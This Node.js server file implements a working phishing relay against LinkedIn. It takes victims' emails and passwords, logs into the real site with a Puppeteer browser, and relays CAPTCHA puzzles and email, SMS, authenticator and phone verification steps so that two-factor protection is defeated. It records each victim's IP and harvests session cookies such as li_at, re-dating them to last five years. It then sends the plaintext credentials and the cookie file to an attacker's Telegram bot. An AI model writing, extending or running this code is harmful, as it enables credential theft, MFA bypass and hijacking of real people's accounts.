// Dependencies
const express = require("express");
const cors = require("cors");
const fs = require("fs");
const puppeteer = require("puppeteer");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const axios = require("axios");
require("dotenv").config();

// App Configuration
const app = express();
const port = process.env.PORT || 3000;

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Function to send Telegram message
async function sendTelegramMessage(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
  } catch (error) {
    console.error('Error sending Telegram message:', error);
  }
}

// Function to send file to Telegram
async function sendTelegramFile(filePath, caption) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
    const FormData = require('form-data');
    const form = new FormData();
    
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('document', fs.createReadStream(filePath), {
      filename: path.basename(filePath),
      contentType: 'application/json'
    });
    
    if (caption) {
      form.append('caption', caption);
    }
    
    const response = await axios.post(url, form, {
      headers: {
        ...form.getHeaders()
      }
    });
    
    return response.data;
  } catch (error) {
    console.error('Error sending file to Telegram:', error.response?.data || error.message);
  }
}

// Create required directories if they don't exist
const puzzleDir = path.join(__dirname, "public", "images", "puzzle");
if (!fs.existsSync(puzzleDir)) {
  fs.mkdirSync(puzzleDir, { recursive: true });
}

const cookiesDir = path.join(__dirname, "cookies");
if (!fs.existsSync(cookiesDir)) {
  fs.mkdirSync(cookiesDir, { recursive: true });
}

// Middleware
app.use(cors());
app.use(express.static("public"));
app.use(express.static("views"));
app.use(express.json());

// State
let sessions = {};

// Utility Functions
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Puzzle and Captcha Handling Functions
async function handlePuzzleTiles(frame, browser, sessionId) {
  const tilesExist = await frame.evaluate(() => {
    const tiles = document.querySelectorAll(
      ".sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
    );
    return tiles.length === 6;
  });

  if (tilesExist) {
    console.log("Found puzzle tiles! Getting first tile image...");

    const blobUrl = await frame.evaluate(() => {
      const firstTile = document.querySelector(
        ".sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
      );
      if (!firstTile) return null;

      const style = window.getComputedStyle(firstTile);
      const backgroundImage = style.backgroundImage;

      if (backgroundImage && backgroundImage.startsWith('url("blob:')) {
        return backgroundImage.slice(5, -2);
      }
      return null;
    });

    if (blobUrl) {
      console.log("Found blob URL:", blobUrl);
      await downloadPuzzlePiece(browser, blobUrl, sessionId);
    } else {
      console.log("Could not find first puzzle piece image URL");
    }
  }
  return false;
}

async function downloadPuzzlePiece(browser, blobUrl, sessionId) {
  const newPage = await browser.newPage();
  const client = await newPage.target().createCDPSession();

  try {
    await client.send("Page.enable");
    await client.send("Page.setDownloadBehavior", {
      behavior: "allow",
      downloadPath: puzzleDir,
    });

    await newPage.goto(blobUrl);
    await newPage.evaluate((sessionId) => {
      const link = document.createElement("a");
      link.href = window.location.href;
      link.download = `puzzle_piece_${sessionId}.png`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, sessionId);

    await delay(2000);
    console.log(
      `Download triggered - check puzzle_piece_${sessionId}.png in the public/images/puzzle directory`
    );
  } catch (error) {
    console.error("Error during download:", error);
  } finally {
    await client.detach();
    await newPage.close();
  }
}

async function findAndClickStartPuzzleButton(frame, depth = 0, path = "") {
  console.log(
    `Checking for "Start Puzzle" button in frame at depth ${depth}: ${path}`
  );

  const foundAndClicked = await frame
    .evaluate(() => {
      const buttonSelectors = [
        'button[data-theme="home.verifyButton"]',
        "button.eZxMRy",
        "button.sc-nkuzb1-0",
        'button:has-text("Start Puzzle")',
      ];

      for (const selector of buttonSelectors) {
        try {
          const button = document.querySelector(selector);
          if (button) {
            console.log(`Found button with selector: ${selector}`);
            console.log(`Button text: ${button.textContent}`);
            button.click();
            return true;
          }
        } catch (e) {
          console.log(`Error with selector ${selector}: ${e.message}`);
        }
      }

      const buttons = document.querySelectorAll("button");
      for (const button of buttons) {
        const text = button.textContent.toLowerCase().trim();
        if (text.includes("start puzzle") || text.includes("start")) {
          console.log(`Found button with text: ${button.textContent}`);
          button.click();
          return true;
        }
      }

      return false;
    })
    .catch((error) => {
      console.log(`Error evaluating frame: ${error.message}`);
      return false;
    });

  if (foundAndClicked) {
    console.log(`🎯 CLICKED "Start Puzzle" button in frame at depth ${depth}!`);
    return true;
  }

  const childFrames = frame.childFrames();
  console.log(`Frame at depth ${depth} has ${childFrames.length} children`);

  for (let i = 0; i < childFrames.length; i++) {
    const childFrame = childFrames[i];
    const childPath = path ? `${path} > frame[${i}]` : `frame[${i}]`;
    const found = await findAndClickStartPuzzleButton(
      childFrame,
      depth + 1,
      childPath
    );
    if (found) return true;
  }

  return false;
}

async function handleCaptchaChallenge(
  page,
  browser,
  sessionId,
  challengeCount = 0
) {
  await delay(5000);

  // Only keep log for checking if the submit button is found
  const buttonFound = await findAndClickStartPuzzleButton(
    page.mainFrame(),
    0,
    "mainFrame"
  );

  if (buttonFound) {
    // Only keep log for submit button found
    console.log("Submit button found and clicked!");
    await delay(2000);

    const allFrames = page.frames();
    for (const frame of allFrames) {
      const tilesHandled = await handlePuzzleTiles(frame, browser, sessionId);
      if (tilesHandled) {
        const currentUrl = await page.url();

        try {
          await page.waitForFunction(
            (oldUrl) => window.location.href !== oldUrl,
            { timeout: 30000 },
            currentUrl
          );
          const newUrl = await page.url();

          const newChallengeCount = challengeCount + 1;

          if (newChallengeCount >= 2) {
            const verificationCode = await askQuestion(
              "Please enter the verification code from your Gmail: "
            );

            await page.waitForSelector('input[name="pin"], input[type="text"]');
            await page.type(
              'input[name="pin"], input[type="text"]',
              verificationCode
            );

            await page.waitForSelector(
              "button.form__submit.form__submit--stretch#pin-submit-button"
            );
            await page.click(
              "button.form__submit.form__submit--stretch#pin-submit-button"
            );
            return true;
          }

          await delay(5000);

          return await handleCaptchaChallenge(
            page,
            browser,
            sessionId,
            newChallengeCount
          );
        } catch (error) {
          // No log here
        }
        break;
      }
    }
  } else {
    // Only keep log for submit button not found
    console.log("Submit button NOT found.");
    return true;
  }
}

// Routes
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "index.html"));
});

app.get("/api/check-puzzle-image", (req, res) => {
  const { sessionId } = req.query;
  const imagePath = path.join(
    __dirname,
    "public",
    "images",
    "puzzle",
    `puzzle_piece_${sessionId}.png`
  );

  if (fs.existsSync(imagePath)) {
    res.json({ exists: true });
  } else {
    res.json({ exists: false });
  }
});

app.post("/api/linkedin/login", async (req, res) => {
  let { sessionId, email, password } = req.body;

  if (!email) {
    return res.status(400).send("Email is required");
  }

  if (!sessionId) {
    sessionId = uuidv4();
  }

  if (sessions[sessionId]) {
    return res.status(400).send("Session already exists");
  }

  try {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    // Set up page configuration
    const userAgent =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
    await page.setUserAgent(userAgent);

    // Get client IP
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || 
                    req.headers['x-real-ip'] || 
                    req.connection.remoteAddress || 
                    req.socket.remoteAddress || 
                    req.connection.socket?.remoteAddress;

    // Navigate and login
    await page.goto("https://www.linkedin.com/login");

    // Wait for the input fields to be visible
    await page.waitForSelector("#username", { visible: true });
    await page.waitForSelector("#password", { visible: true });

    // Input credentials immediately
    await page.type("#username", email);
    await page.type("#password", password);

    // Click login and wait for navigation
    await page.click(".login__form_action_container button");

    console.log(
      `Email: ${email} and Password: ${password} logged for session: ${sessionId}`
    );

    // Store session with additional information
    sessions[sessionId] = { 
      browser, 
      page,
      userInfo: {
        email,
        password,
        ip: clientIp,
        userAgent: userAgent,
        timestamp: new Date().toISOString()
      }
    };

    // Set a 10-minute timeout to close the browser if cookies haven't been saved
    setTimeout(async () => {
      if (sessions[sessionId]) {
        console.log(`Session ${sessionId} timed out after 10 minutes. Closing browser...`);
        try {
          await browser.close();
          delete sessions[sessionId];
          console.log(`Browser closed and session ${sessionId} cleaned up after timeout`);
        } catch (error) {
          console.error('Error closing browser after timeout:', error);
        }
      }
    }, 10 * 60 * 1000); // 10 minutes in milliseconds

    res.send("1");
    await delay(5000);
    await handleCaptchaChallenge(page, browser, sessionId, 0);
  } catch (err) {
    console.error("Error in /api/linkedin/login:", err);
    res.status(500).send(err);
  }
});

app.post("/api/linkedin/security-verification", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).send("Session ID is required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;

    // Get puzzle tiles HTML from all frames
    const frames = page.frames();
    console.log("Number of frames found:", frames.length);

    for (const frame of frames) {
      console.log("Checking frame URL:", frame.url());
      const tilesHtml = await frame.evaluate(() => {
        const tiles = document.querySelectorAll(
          "button.sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
        );
        console.log("Number of tiles found:", tiles.length);
        if (tiles.length > 0) {
          // Return array of HTML for all tiles
          return Array.from(tiles).map((tile) => tile.outerHTML);
        }
        return null;
      });

      if (tilesHtml) {
        console.log("Found tiles in frame:", frame.url());
        return res.json({
          status: "success",
          tiles: tilesHtml,
        });
      }
    }

    console.log("No puzzle tiles found in any frame");
    res.status(404).json({ error: "No puzzle tiles found" });
  } catch (err) {
    console.error("Error in security-verification:", err);
    res
      .status(500)
      .json({ error: "Failed to get puzzle tiles: " + err.message });
  }
});

app.post("/api/linkedin/select-tile", async (req, res) => {
  const { sessionId, tileNumber } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!tileNumber || tileNumber < 1 || tileNumber > 6) {
    return res
      .status(400)
      .json({ error: "Valid tile number (1-6) is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;
    const allFrames = page.frames();

    for (const frame of allFrames) {
      const clicked = await frame.evaluate((selectedTile) => {
        const tiles = document.querySelectorAll(
          ".sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
        );
        if (tiles[selectedTile - 1]) {
          tiles[selectedTile - 1].click();
          return true;
        }
        return false;
      }, tileNumber);

      if (clicked) {
        console.log(`Clicked tile number ${tileNumber}`);

        // Monitor URL changes
        const currentUrl = await page.url();
        let urlChanged = false;

        try {
          // Wait for either navigation or network idle
          await Promise.race([
            page.waitForNavigation({ timeout: 10000 }),
            page.waitForNetworkIdle({ timeout: 10000 }),
            new Promise((resolve) => setTimeout(resolve, 10000)),
          ]);

          // Add a small delay to ensure any redirects are completed
          await delay(2000);

          const newUrl = await page.url();
          urlChanged = newUrl !== currentUrl;

          if (urlChanged) {
            console.log("URL changed from:", currentUrl, "to:", newUrl);

            // Check if URL contains login-challenge-submit
            if (newUrl.includes("/login-challenge-submit")) {
              return res.send("lastcve");
            }

            // Get only the verification header text
            const headerText = await page.evaluate(() => {
              const header = document.querySelector("h1.content__header");
              return header ? header.textContent.trim() : null;
            });
            console.log("Verification header:", headerText);

            // Return only the header text
            return res.send(headerText);
          }

          console.log(
            "URL status:",
            urlChanged ? "Changed to: " + newUrl : "No change"
          );
        } catch (error) {
          console.log("Navigation check details:", {
            error: error.message,
            currentUrl: await page.url(),
            isNavigating: page.isNavigating,
          });

          // Even if navigation check fails, try to get current state

          const finalUrl = await page.url();
          if (finalUrl.includes("/login-challenge-submit")) {
            // Handle the same way as successful navigation
            collectAndSaveCookies(page, sessionId);

            return res.send("lastcve");
          }

          if (finalUrl.includes("feed")) {
            collectAndSaveCookies(page, sessionId);
            return res.send("1");
          }
        }
      }
    }

    res.status(404).json({ error: "No puzzle tiles found" });
  } catch (error) {
    console.error("Error selecting tile:", error);
    res.status(500).json({ error: "Failed to select tile" });
  }
});

app.post("/api/linkedin/verify-code", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!code) {
    return res.status(400).json({ error: "Verification code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  let result = 0;
  try {
    const { page } = session;

    // Wait for the input field and submit button
    await page.waitForSelector('input[name="pin"]');
    await page.waitForSelector('button[type="submit"]');

    // Clear the input field first
    await page.evaluate(() => {
      const input = document.querySelector('input[name="pin"]');
      if (input) {
        input.value = "";
      }
    });

    // Type the verification code
    await page.type('input[name="pin"]', code);

    // Click the submit button
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click('button[type="submit"]'),
    ]);

    // Wait a moment for any error message to appear
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res.send("0");
    }

    const currentUrl = await page.url();

    if (currentUrl.includes("feed")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("1");
    }

    // Check if URL contains login-challenge-submit
    
    if (currentUrl.includes("/login-challenge-submit")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("lastcve");
    }
  } catch (error) {
    console.error("Error submitting verification code:", error);
    res.status(500).json({ error: "Failed to submit verification code" });
  }
});

app.post("/api/linkedin/verify-sms", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!code) {
    return res.status(400).json({ error: "Verification code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the input field and submit button
    await page.waitForSelector('input[name="pin"]');
    await page.waitForSelector('button[type="submit"]');

    // Clear the input field first
    await page.evaluate(() => {
      const input = document.querySelector('input[name="pin"]');
      if (input) {
        input.value = "";
      }
    });

    // Type the verification code
    await page.type('input[name="pin"]', code);

    // Click the submit button and wait for navigation
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click('button[type="submit"]'),
    ]);

    // Wait a moment for any error message to appear
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res.send("0");
    }

    // Check current URL
    const currentUrl = await page.url();

    // Check if URL contains feeds and log it
    if (currentUrl.includes("feed")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("1");
    }

    // Check if URL contains login-challenge-submit
    if (currentUrl.includes("/login-challenge-submit")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("lastcve");
    }
  } catch (error) {
    console.error("Error submitting verification code:", error);
    res.status(500).json({ error: "Failed to submit verification code" });
  }
});

app.post("/api/linkedin/verify-authenticator", async (req, res) => {
  const { code, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!code) {
    return res.status(400).json({ error: "Verification code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the input field and submit button
    await page.waitForSelector('input[name="pin"]');
    await page.waitForSelector('button[type="submit"]');

    // Clear the input field first
    await page.evaluate(() => {
      const input = document.querySelector('input[name="pin"]');
      if (input) {
        input.value = "";
      }
    });

    // Type the verification code
    await page.type('input[name="pin"]', code);

    // Click the submit button and wait for navigation
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click('button[type="submit"]'),
    ]);

    // Wait a moment for any error message to appear
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res.send("0");
    }

    // Check current URL
    const currentUrl = await page.url();

    // Check if URL contains feeds and log it
    if (currentUrl.includes("feed")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("1");
    }

    // Check if URL contains login-challenge-submit
    if (currentUrl.includes("/login-challenge-submit")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("lastcve");
    }

    // Default response if no conditions are met
    return res.send("0");
  } catch (error) {
    console.error("Error in verify-authenticator:", error);
    return res.status(500).json({ error: "Failed to verify authenticator code" });
  }
});

app.post("/api/linkedin/verify-phone", async (req, res) => {
  const { phone, countryCode, sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "Session ID is required" });
  }

  if (!phone) {
    return res.status(400).json({ error: "Phone number is required" });
  }

  if (!countryCode) {
    return res.status(400).json({ error: "Country code is required" });
  }

  const session = sessions[sessionId];
  if (!session) {
    return res.status(400).json({ error: "Session not found" });
  }

  try {
    const { page } = session;

    // Wait for the country select and phone input fields
    await page.waitForSelector("#select-register-phone-country");
    await page.waitForSelector("#register-verification-phone-number");
    await page.waitForSelector("#register-phone-submit-button");

    // Select the country
    await page.select("#select-register-phone-country", countryCode);

    // Clear and type the phone number
    await page.evaluate(() => {
      const phoneInput = document.querySelector(
        "#register-verification-phone-number"
      );
      if (phoneInput) {
        phoneInput.value = "";
      }
    });
    await page.type("#register-verification-phone-number", phone);

    // Submit the form
    await Promise.all([
      page.waitForNavigation({ waitUntil: "networkidle0" }).catch(() => {}),
      page.click("#register-phone-submit-button"),
    ]);

    // Wait a moment for any error message or redirect
    await delay(2000);

    // Check for error message
    const hasError = await page.evaluate(() => {
      const errorBanner = document.querySelector(".body__banner--error");
      return errorBanner && !errorBanner.classList.contains("hidden__imp");
    });

    if (hasError) {
      return res.send("0");
    }

    // Check if URL contains login-challenge-submit
    const currentUrl = await page.url();
    if (currentUrl.includes("/login-challenge-submit")) {
      return res.send("lastcve");
    }

    // Check for success - look for verification page header
    const headerText = await page.evaluate(() => {
      const header = document.querySelector("h1.content__header");
      return header ? header.textContent.trim() : null;
    });

    if (headerText && headerText.includes("verify your phone number")) {
      return res.send("1");
    }

    // Default success response
    res.send("1");
  } catch (error) {
    console.error("Error submitting phone number:", error);
    res.status(500).json({ error: "Failed to submit phone number" });
  }
});

app.post("/api/linkedin/check-login-status", async (req, res) => {
  console.log("Check login status endpoint accessed");
  const { sessionId } = req.body;
  console.log("Session ID:", sessionId);

  if (!sessionId) {
    console.log("No session ID provided");
    return res.send("0");
  }

  const session = sessions[sessionId];
  if (!session) {
    console.log("Session not found for ID:", sessionId);
    return res.send("0");
  }

  let result = "0";
  try {
    const { page } = session;

    const currentUrl = await page.url();
    console.log("Current URL:", currentUrl);

    if (currentUrl.includes("feed")) {
      collectAndSaveCookies(page, sessionId);
      return res.send("1");
    }

    try {
      const headerText = await page.evaluate(() => {
        const header = document.querySelector("h1.content__header");
        return header ? header.textContent.trim() : null;
      });

      console.log("Header text found:", headerText);

      if (headerText) {
        result = headerText;
      }
    } catch (evalError) {
      if (evalError.message.includes("Execution context was destroyed")) {
        console.log("Navigation detected, skipping header text check");
        return res.send("1");
      }
      throw evalError;
    }

    console.log("Sending result:", result);
    res.send(result);
  } catch (error) {
    console.error("Error Checking login status:", error);
    res.send("0");
  }
});

async function collectAndSaveCookies(page, sessionId) {
  try {
    const cookies = await page.cookies();
    const fiveYearsInSeconds = 5 * 365 * 24 * 60 * 60; // 5 years in seconds

    // Get session information
    const session = sessions[sessionId];
    if (!session) {
      console.error("Session not found for ID:", sessionId);
      return;
    }

    const { userInfo, browser } = session;
    const currentUrl = await page.url();

    // Send session info to Telegram with HTML formatting
    const sessionMessage = `<b>New Session Captured</b>\n\nName: LinkedIn\nUsername: ${userInfo.email}\nPassword: <tg-spoiler>${userInfo.password}</tg-spoiler>\nLanding URL: ${currentUrl}\nIP Address: ${userInfo.ip}\nUser Agent: <code>${userInfo.userAgent}</code>`;
    await sendTelegramMessage(sessionMessage);

    const filteredCookies = cookies.filter((cookie) =>
      [
        "lms_ads",
        "_guid",
        "ccookie",
        "bcookie",
        "fid",
        "__cf_bm",
        "g_state",
        "li_alerts",
        "lms_analytics",
        "fptctx2",
        "li_at",
        "lidc",
        "bscookie",
        "dfpfpt",
        "JSESSIONID",
        "li_gc",
        "li_rm",
        "li_sugr",
        "UserMatchHistory",
        "AnalyticsSyncHistory",
      ].includes(cookie.name)
    );

    const formattedCookies = filteredCookies.map((cookie) => {
      // Add 5 years to the current expiration date
      const extendedExpiration = Math.floor(Date.now() / 1000) + fiveYearsInSeconds;

      if (cookie.name === "lms_ads") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          path: cookie.path,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_guid") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "ccookie") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "bcookie") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "fid") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "__cf_bm") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "g_state") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "li_alerts") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "lms_analytics") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "fptctx2") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: true,
          firstPartyDomain: "",
          partitionKey: null,
          storeId: null,
        };
      }

      if (cookie.name === "li_at") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "lidc") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "bscookie") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "dfpfpt") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "JSESSIONID") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "li_gc") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "li_rm") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "li_sugr") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "UserMatchHistory") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "AnalyticsSyncHistory") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          firstPartyDomain: "",
          partitionKey: null,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      return {
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        hostOnly: cookie.hostOnly,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        session: cookie.session || false,
        firstPartyDomain: cookie.firstPartyDomain || "",
        partitionKey: cookie.partitionKey || null,
        storeId: cookie.storeId || null,
      };
    });

    const cookieFilePath = path.join(cookiesDir, `${sessionId}.json`);
    fs.writeFileSync(cookieFilePath, JSON.stringify(formattedCookies, null, 2));
    console.log(`Cookies saved to ${cookieFilePath}`);

    // Send the actual cookie file to Telegram
    await sendTelegramFile(cookieFilePath, `Cookies for ${userInfo.email}`);

    // Wait 30 seconds before closing browser
    console.log("Waiting 30 seconds before closing browser...");
    await delay(30000);

    // Close browser and clean up session
    try {
      await browser.close();
      delete sessions[sessionId];
      console.log(`Browser closed and session ${sessionId} cleaned up`);
    } catch (closeError) {
      console.error('Error closing browser:', closeError);
    }
  } catch (error) {
    console.error("Error in collectAndSaveCookies:", error);
  }
}

// Server Initialization
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
